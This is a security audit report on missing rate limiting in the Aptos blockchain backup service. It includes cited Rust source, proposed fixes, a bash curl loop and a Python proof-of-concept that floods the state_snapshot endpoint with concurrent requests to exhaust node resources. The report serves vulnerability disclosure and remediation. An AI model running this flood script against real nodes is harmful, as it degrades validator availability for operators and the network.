# Audit Report

## Title
Backup Service Lacks Rate Limiting, Enabling Resource Exhaustion via Unlimited Concurrent Requests to Expensive Endpoints

## Summary
The Aptos backup service exposes multiple expensive endpoints (particularly `state_snapshot` and `state_snapshot_chunk`) without any rate limiting or request throttling mechanisms. An attacker can exhaust validator node resources by making unlimited concurrent requests that iterate through millions of state items, causing significant CPU, memory, and I/O consumption that degrades node performance or crashes the API.

## Finding Description

The backup service implements multiple HTTP endpoints in the `get_routes()` function, including highly expensive operations like `state_snapshot` that can iterate through the entire blockchain state (potentially billions of items). However, the service implements **no rate limiting or request throttling** at any layer. [1](#0-0) 

The `state_snapshot` endpoint specifically requests ALL state items from index 0 to `usize::MAX`: [2](#0-1) 

Each request spawns a blocking task via `tokio::task::spawn_blocking` without any per-client or per-endpoint limits: [3](#0-2) 

The server is started with a basic Warp configuration that provides no rate limiting middleware: [4](#0-3) 

The only protection is a weak global limit of 64 concurrent blocking threads shared across ALL endpoints: [5](#0-4) 

This limit is insufficient because:
1. 64 concurrent expensive operations can still overwhelm node resources
2. It's shared across all backup service endpoints (not per-endpoint)
3. No per-IP or per-client limiting exists
4. Each `state_snapshot` request iterates through the Jellyfish Merkle tree and fetches millions of values from RocksDB [6](#0-5) [7](#0-6) 

The system is designed to handle state snapshots with billions of items, confirming the severity of this attack vector.

**Attack Scenario:**
1. Attacker identifies a validator node running the backup service
2. Attacker sends 64+ concurrent GET requests to `/state_snapshot/<version>` or `/state_snapshot_chunk/<version>/<start_idx>/<large_limit>`
3. Each request spawns a blocking task that begins iterating through millions of state items
4. Node experiences:
   - CPU saturation from Merkle tree iteration and BCS serialization
   - Memory exhaustion from buffering multiple large responses
   - I/O saturation from concurrent RocksDB reads
   - Overall performance degradation affecting consensus participation
5. Legitimate backup requests and other node operations are starved of resources

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

This vulnerability qualifies as **High Severity** per the Aptos Bug Bounty program criteria:
- **"Validator node slowdowns"**: Concurrent expensive backup requests consume significant CPU, memory, and I/O resources, degrading validator performance and potentially affecting consensus participation
- **"API crashes"**: Resource exhaustion can cause the backup service API to become unresponsive or crash due to memory/thread pool exhaustion

While this doesn't directly cause consensus safety violations or fund loss, it significantly impacts node availability and performance, which are critical for network health. Multiple validators experiencing simultaneous attacks could degrade network performance.

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is **highly likely to be exploited** because:
1. **Trivial exploitation**: Attack requires only sending HTTP GET requests (no authentication, special tools, or deep protocol knowledge needed)
2. **Public attack surface**: Backup service endpoints are typically exposed to allow backup operations
3. **No attacker requirements**: Any network peer can execute the attack without validator access or stake
4. **Low detection difficulty**: Simple tools like `curl`, `wget`, or Python scripts can generate concurrent requests
5. **Immediate impact**: Effects are observable within seconds of attack initiation
6. **Script kiddie accessible**: Attack can be automated with basic HTTP client libraries

Example attack command:
```bash
for i in {1..100}; do curl -s "http://node:6186/state_snapshot/1000000" & done
```

## Recommendation

Implement multi-layered rate limiting and request throttling:

**1. Per-endpoint rate limiting:**
```rust
use governor::{Quota, RateLimiter};
use std::num::NonZeroU32;

// In get_routes() function
let rate_limiter = Arc::new(RateLimiter::direct(
    Quota::per_second(NonZeroU32::new(5).unwrap()) // 5 state_snapshot requests/sec
));

let state_snapshot = warp::path!(Version)
    .and(with_rate_limit(rate_limiter.clone()))
    .map(move |version| {
        // existing handler code
    });
```

**2. Per-IP rate limiting:**
Implement IP-based rate limiting using the client's remote address to prevent single actors from consuming all slots.

**3. Request size limits:**
Add maximum limits for `state_snapshot_chunk` requests:
```rust
let state_snapshot_chunk = warp::path!(Version / usize / usize)
    .and_then(|version, start_idx, limit| async move {
        const MAX_CHUNK_SIZE: usize = 100_000;
        if limit > MAX_CHUNK_SIZE {
            return Err(warp::reject::custom(ExcessiveChunkSize));
        }
        Ok((version, start_idx, limit))
    })
    // ... rest of handler
```

**4. Concurrent request limiting per endpoint:**
Use a semaphore to limit concurrent expensive operations:
```rust
let semaphore = Arc::new(tokio::sync::Semaphore::new(4)); // Max 4 concurrent state_snapshot requests

let state_snapshot = warp::path!(Version)
    .and_then({
        let sem = semaphore.clone();
        move |version| {
            let sem = sem.clone();
            async move {
                let _permit = sem.acquire().await
                    .map_err(|_| warp::reject::reject())?;
                // handler code with permit held
            }
        }
    });
```

**5. Authentication/Authorization:**
Consider requiring API keys or authentication for backup service access, especially for expensive endpoints.

## Proof of Concept

```python
#!/usr/bin/env python3
"""
PoC: Backup Service Resource Exhaustion Attack
Demonstrates concurrent requests overwhelming the backup service
"""

import asyncio
import aiohttp
import time
import sys

BACKUP_SERVICE_URL = "http://localhost:6186"
CONCURRENT_REQUESTS = 100  # Far exceeds the 64 thread limit
TARGET_VERSION = 1000000  # Recent version with substantial state

async def attack_state_snapshot(session, request_id):
    """Send a single state_snapshot request"""
    url = f"{BACKUP_SERVICE_URL}/state_snapshot/{TARGET_VERSION}"
    start_time = time.time()
    
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=300)) as response:
            # Attempt to read response (will be large)
            chunks_read = 0
            async for _ in response.content.iter_chunked(8192):
                chunks_read += 1
                if chunks_read % 100 == 0:
                    print(f"[Request {request_id}] Read {chunks_read} chunks")
            
            elapsed = time.time() - start_time
            print(f"[Request {request_id}] Completed in {elapsed:.2f}s")
            return True
    except asyncio.TimeoutError:
        print(f"[Request {request_id}] Timed out")
        return False
    except Exception as e:
        print(f"[Request {request_id}] Error: {e}")
        return False

async def main():
    """Launch concurrent attack requests"""
    print(f"[*] Starting resource exhaustion attack against {BACKUP_SERVICE_URL}")
    print(f"[*] Launching {CONCURRENT_REQUESTS} concurrent state_snapshot requests")
    print(f"[*] Target version: {TARGET_VERSION}")
    print()
    
    # Use connection pooling to reuse connections
    connector = aiohttp.TCPConnector(limit=CONCURRENT_REQUESTS)
    timeout = aiohttp.ClientTimeout(total=300, connect=10)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        # Launch all requests concurrently
        tasks = [
            attack_state_snapshot(session, i)
            for i in range(CONCURRENT_REQUESTS)
        ]
        
        start_time = time.time()
        results = await asyncio.gather(*tasks, return_exceptions=True)
        elapsed = time.time() - start_time
        
        successes = sum(1 for r in results if r is True)
        failures = len(results) - successes
        
        print()
        print(f"[*] Attack completed in {elapsed:.2f}s")
        print(f"[*] Successful requests: {successes}/{len(results)}")
        print(f"[*] Failed requests: {failures}/{len(results)}")
        print()
        print("[*] During attack, monitor node for:")
        print("    - High CPU usage (Merkle tree iteration)")
        print("    - Memory growth (response buffering)")
        print("    - Increased I/O wait (RocksDB reads)")
        print("    - Degraded consensus performance")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        BACKUP_SERVICE_URL = sys.argv[1]
    
    print(f"Target: {BACKUP_SERVICE_URL}")
    print("Press Ctrl+C to abort...")
    time.sleep(2)
    
    asyncio.run(main())
```

**To demonstrate the vulnerability:**

1. Start an Aptos node with backup service enabled on port 6186
2. Run the PoC script: `python3 backup_exhaustion_poc.py http://node-ip:6186`
3. Monitor node metrics during attack:
   - CPU usage will spike significantly
   - Memory consumption will grow
   - I/O operations will saturate
   - Response times for legitimate requests will degrade
4. The node may become unresponsive or crash under sustained attack

**Expected behavior with fix:** Requests beyond rate limits should receive HTTP 429 (Too Many Requests) responses, and node resources should remain stable under attack.

## Notes

The client-side `concurrent_data_requests` configuration found in backup-cli is NOT server-side protectionâ€”it only limits how many requests a single legitimate backup client makes, but does not protect against malicious actors making unlimited requests from multiple sources or circumventing client-side limits. [8](#0-7) 

The 64-thread blocking pool limit provides minimal protection and is easily saturated by a determined attacker, making proper rate limiting essential for production deployments.

### Citations

**File:** storage/backup/backup-service/src/handlers/mod.rs (L27-147)
```rust
pub(crate) fn get_routes(backup_handler: BackupHandler) -> BoxedFilter<(impl Reply,)> {
    // GET db_state
    let bh = backup_handler.clone();
    let db_state = warp::path::end()
        .map(move || reply_with_bcs_bytes(DB_STATE, &bh.get_db_state()?))
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_range_proof/<version>/<end_key>
    let bh = backup_handler.clone();
    let state_range_proof = warp::path!(Version / HashValue)
        .map(move |version, end_key| {
            reply_with_bcs_bytes(
                STATE_RANGE_PROOF,
                &bh.get_account_state_range_proof(end_key, version)?,
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_snapshot/<version>
    let bh = backup_handler.clone();
    let state_snapshot = warp::path!(Version)
        .map(move |version| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT, move |bh, sender| {
                bh.get_state_item_iter(version, 0, usize::MAX)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET state_item_count/<version>
    let bh = backup_handler.clone();
    let state_item_count = warp::path!(Version)
        .map(move |version| {
            reply_with_bcs_bytes(
                STATE_ITEM_COUNT,
                &(bh.get_state_item_count(version)? as u64),
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_snapshot_chunk/<version>/<start_idx>/<limit>
    let bh = backup_handler.clone();
    let state_snapshot_chunk = warp::path!(Version / usize / usize)
        .map(move |version, start_idx, limit| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT_CHUNK, move |bh, sender| {
                bh.get_state_item_iter(version, start_idx, limit)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET state_root_proof/<version>
    let bh = backup_handler.clone();
    let state_root_proof = warp::path!(Version)
        .map(move |version| {
            reply_with_bcs_bytes(STATE_ROOT_PROOF, &bh.get_state_root_proof(version)?)
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET epoch_ending_ledger_infos/<start_epoch>/<end_epoch>/
    let bh = backup_handler.clone();
    let epoch_ending_ledger_infos = warp::path!(u64 / u64)
        .map(move |start_epoch, end_epoch| {
            reply_with_bytes_sender(&bh, EPOCH_ENDING_LEDGER_INFOS, move |bh, sender| {
                bh.get_epoch_ending_ledger_info_iter(start_epoch, end_epoch)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET transactions/<start_version>/<num_transactions>
    let bh = backup_handler.clone();
    let transactions = warp::path!(Version / usize)
        .map(move |start_version, num_transactions| {
            reply_with_bytes_sender(&bh, TRANSACTIONS, move |bh, sender| {
                bh.get_transaction_iter(start_version, num_transactions)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET transaction_range_proof/<first_version>/<last_version>
    let bh = backup_handler;
    let transaction_range_proof = warp::path!(Version / Version)
        .map(move |first_version, last_version| {
            reply_with_bcs_bytes(
                TRANSACTION_RANGE_PROOF,
                &bh.get_transaction_range_proof(first_version, last_version)?,
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // Route by endpoint name.
    let routes = warp::any()
        .and(warp::path(DB_STATE).and(db_state))
        .or(warp::path(STATE_RANGE_PROOF).and(state_range_proof))
        .or(warp::path(STATE_SNAPSHOT).and(state_snapshot))
        .or(warp::path(STATE_ITEM_COUNT).and(state_item_count))
        .or(warp::path(STATE_SNAPSHOT_CHUNK).and(state_snapshot_chunk))
        .or(warp::path(STATE_ROOT_PROOF).and(state_root_proof))
        .or(warp::path(EPOCH_ENDING_LEDGER_INFOS).and(epoch_ending_ledger_infos))
        .or(warp::path(TRANSACTIONS).and(transactions))
        .or(warp::path(TRANSACTION_RANGE_PROOF).and(transaction_range_proof));

    // Serve all routes for GET only.
    warp::get()
        .and(routes)
        .with(warp::log::custom(|info| {
            let endpoint = info.path().split('/').nth(1).unwrap_or("-");
            LATENCY_HISTOGRAM.observe_with(
                &[endpoint, info.status().as_str()],
                info.elapsed().as_secs_f64(),
            )
        }))
        .boxed()
}
```

**File:** storage/backup/backup-service/src/handlers/utils.rs (L46-65)
```rust
pub(super) fn reply_with_bytes_sender<F>(
    backup_handler: &BackupHandler,
    endpoint: &'static str,
    f: F,
) -> Box<dyn Reply>
where
    F: FnOnce(BackupHandler, &mut bytes_sender::BytesSender) -> DbResult<()> + Send + 'static,
{
    let (sender, stream) = bytes_sender::BytesSender::new(endpoint);

    // spawn and forget, error propagates through the `stream: TryStream<_>`
    let bh = backup_handler.clone();
    let _join_handle = tokio::task::spawn_blocking(move || {
        let _timer =
            BACKUP_TIMER.timer_with(&[&format!("backup_service_bytes_sender_{}", endpoint)]);
        abort_on_error(f)(bh, sender)
    });

    Box::new(Response::new(Body::wrap_stream(stream)))
}
```

**File:** storage/backup/backup-service/src/lib.rs (L12-30)
```rust
pub fn start_backup_service(address: SocketAddr, db: Arc<AptosDB>) -> Runtime {
    let backup_handler = db.get_backup_handler();
    let routes = get_routes(backup_handler);

    let runtime = aptos_runtimes::spawn_named_runtime("backup".into(), None);

    // Ensure that we actually bind to the socket first before spawning the
    // server tasks. This helps in tests to prevent races where a client attempts
    // to make a request before the server task is actually listening on the
    // socket.
    //
    // Note: we need to enter the runtime context first to actually bind, since
    //       tokio TcpListener can only be bound inside a tokio context.
    let _guard = runtime.enter();
    let server = warp::serve(routes).bind(address);
    runtime.handle().spawn(server);
    info!("Backup service spawned.");
    runtime
}
```

**File:** crates/aptos-runtimes/src/lib.rs (L27-51)
```rust
    const MAX_BLOCKING_THREADS: usize = 64;

    // Verify the given name has an appropriate length
    if thread_name.len() > MAX_THREAD_NAME_LENGTH {
        panic!(
            "The given runtime thread name is too long! Max length: {}, given name: {}",
            MAX_THREAD_NAME_LENGTH, thread_name
        );
    }

    // Create the runtime builder
    let atomic_id = AtomicUsize::new(0);
    let thread_name_clone = thread_name.clone();
    let mut builder = Builder::new_multi_thread();
    builder
        .thread_name_fn(move || {
            let id = atomic_id.fetch_add(1, Ordering::SeqCst);
            format!("{}-{}", thread_name_clone, id)
        })
        .on_thread_start(on_thread_start)
        .disable_lifo_slot()
        // Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many
        // Rest API calls overwhelm the node.
        .max_blocking_threads(MAX_BLOCKING_THREADS)
        .enable_all();
```

**File:** storage/aptosdb/src/state_store/mod.rs (L1064-1081)
```rust
    pub fn get_state_key_and_value_iter(
        self: &Arc<Self>,
        version: Version,
        start_idx: usize,
    ) -> Result<impl Iterator<Item = Result<(StateKey, StateValue)>> + Send + Sync + use<>> {
        let store = Arc::clone(self);
        Ok(JellyfishMerkleIterator::new_by_index(
            Arc::clone(&self.state_merkle_db),
            version,
            start_idx,
        )?
        .map(move |res| match res {
            Ok((_hashed_key, (key, version))) => {
                Ok((key.clone(), store.expect_value_by_version(&key, version)?))
            },
            Err(err) => Err(err),
        }))
    }
```

**File:** storage/aptosdb/src/backup/backup_handler.rs (L144-162)
```rust
    /// Iterate through items in a state snapshot
    pub fn get_state_item_iter(
        &self,
        version: Version,
        start_idx: usize,
        limit: usize,
    ) -> Result<impl Iterator<Item = Result<(StateKey, StateValue)>> + Send + use<>> {
        let iterator = self
            .state_store
            .get_state_key_and_value_iter(version, start_idx)?
            .take(limit)
            .enumerate()
            .map(move |(idx, res)| {
                BACKUP_STATE_SNAPSHOT_VERSION.set(version as i64);
                BACKUP_STATE_SNAPSHOT_LEAF_IDX.set((start_idx + idx) as i64);
                res
            });
        Ok(Box::new(iterator))
    }
```

**File:** storage/backup/backup-cli/src/utils/mod.rs (L49-65)
```rust
#[derive(Clone, Parser)]
pub struct GlobalBackupOpt {
    // Defaults to 128MB, so concurrent chunk downloads won't take up too much memory.
    #[clap(
        long = "max-chunk-size",
        default_value_t = 134217728,
        help = "Maximum chunk file size in bytes."
    )]
    pub max_chunk_size: usize,
    #[clap(
        long,
        default_value_t = 8,
        help = "When applicable (currently only for state snapshot backups), the number of \
        concurrent requests to the fullnode backup service. "
    )]
    pub concurrent_data_requests: usize,
}
```
